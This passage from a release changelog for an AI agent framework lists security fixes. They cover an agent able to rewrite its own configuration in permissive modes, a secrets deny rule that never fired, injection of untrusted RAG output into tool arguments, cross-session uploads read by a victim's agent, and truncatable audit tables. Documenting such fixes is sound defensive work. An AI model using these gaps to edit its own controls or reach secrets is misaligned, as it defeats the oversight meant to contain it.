  could not succeed is refused before anyone is asked to approve it.
- A finished terminal command stays readable for a minute, so a short one is
  not lost to a reader that connects late.
- The gosec baseline update refuses a change that would silently drop triaged
  findings.

### Fixed

- Long files in Hindi, Japanese, Russian and other non-Latin scripts were
  refused as binary two times in three.
- A prompt label cut mid-character produced invalid UTF-8 that the database
  refused. Contributed in #38.
- bubblewrap hid a workspace under `/tmp` behind its own tmpfs, so every
  command there failed to start.
- The docs site fails the build when two pages claim one URL instead of
  writing one over the other.

### Security

- **The agent cannot reach its own configuration in any mode.** The file
  tools refuse any path with a `.abhed` component, and the process sandbox
  denies commands reading or writing it, in the workspace and in the home
  directory; `~/.abhed/skills` stays readable. Before this, `auto` and
  `bypass` mode let the write tool rewrite `config.json` or plant
  `users.json`.
- **`/download` withheld nothing.** Any signed-in user could download the
  server's own state (`users.json`, `config.json`) and files a deny rule
  covers. Both are refused now, as the viewer and the agent refuse them.
  Deployments on 0.2.0 should upgrade and treat local account passwords as
  exposed.
- **The audit record is protected from the server's own credentials.** The
  application role owned the tables, so it could truncate them or disable
  the append-only triggers. The runtime role now holds insert and select
  only, a `BEFORE TRUNCATE` trigger stands as well, and the server refuses to
  start as a role that could alter the record. Configure `storage.migrate_dsn`
  for the owner, or `storage.single_role` to keep one role knowingly.
- The egress, credential and configuration boundaries are verified on Linux
  under bubblewrap in a privileged CI job, not only on macOS.

## [0.2.0] - 2026-09-19

### Security

- Uploads no longer land in `.abhed/`, the directory the agent is denied. A
  deployment carrying the ordinary `read(**/.abhed/**)` rule refused every file
  a user attached, and the model reported it as a policy denial for a document
  it had just been handed. Attachments now go to `<workspace>/uploads/`.
- The upload endpoint requires session ownership. Any authenticated caller
  could previously write a file into another user's session directory, which
  the victim's agent then read as untrusted input.
- Policy rules can scope tools whose argument is not `command` or `path`.
  `deny k8s_get(secrets*)` compiled and never fired, and because `k8s_get` is
  read-only the read was auto-approved in auto mode.
- Pipeline tool arguments escape substitutions, so untrusted prior-step or RAG
  output cannot close a JSON string and change the arguments a tool receives.
- The legacy MCP SSE transport pins its POST endpoint to the configured
  origin, so a hostile server cannot redirect client posts — and the auth
  headers they carry — to an arbitrary URL.
- Extension `environ` layers on the inherited environment instead of replacing
  it, so setting one variable no longer drops `HOME`, `PATH` and the locale.

### Added

- `max_budget_tokens` is enforced on the primary agent, not only at
  subagent-spawn time. A session that exhausts its allowance ends with the
  terminal reason `max_budget`.
- Sessions record how full the context was, not only what they cost.
  `context_tokens` and `context_window` sit alongside the cumulative token
  totals in the session record and the `session.ended` event.
- The CLI shows a thinking indicator while the model works, completes slash
  commands as they are typed, and displays the model's reasoning, collapsed by
  default and expanded with `/think`.

### Fixed

- A session ended by server shutdown records the terminal reason `shutdown`
  rather than `user_interrupt`, so the audit log can tell a user stopping a run
  from the process going away.
- Every terminal reason is now either emitted in live code or marked reserved.
  Nine were defined, six reachable, and the README claimed eight.
- `exit` and `quit` end an interactive CLI session. Without a leading slash
  they were sent to the model as a prompt.

### Changed

- CI gates on CVEs, coverage and the adversarial suite. Scans cover the built
  binary and the container image, not only the source, and a scan that does
  not run fails the build rather than reading as clean. Coverage may not drop
  below the recorded floor.

### Documentation

- The `vm` sandbox tier is documented as gVisor, which is what ships, rather
  than a Firecracker or Kata microVM, which does not.
- The security document states that the opt-in network tools execute outside
  the sandbox boundary, and which of them auto mode approves without a prompt.
- Benchmark results separate token count from cost, with the input and output
  split, because tokens are only cost on a hosted per-token API.

## [0.1.0] - 2026-09-15

The first public release of the Community Edition.

### Added
- The agent loop with tool contracts, a tiered execution sandbox, and a
  permission engine whose deny rules hold in every mode.
- Twenty model providers over three wire formats, chosen per session.
- Five ways to run it: interactive, headless (`-p`), JSON events per line,
  JSONL RPC over stdio, and a single-tenant server with a web console.
- A Go SDK that gives your own program the same loop with the same policy
  and audit guarantees, including validated structured output.
- An append-only audit record with replay, fork from any step, and export,
  in memory or in Postgres with row-level security.
- Skills, extensions (JSONL over stdio, veto-only), MCP servers, and
  parallel subagents in git worktrees.
- `abhed doctor`, which proves the endpoint answers, tool calling works,
  and a command runs under the sandbox before you trust a run.
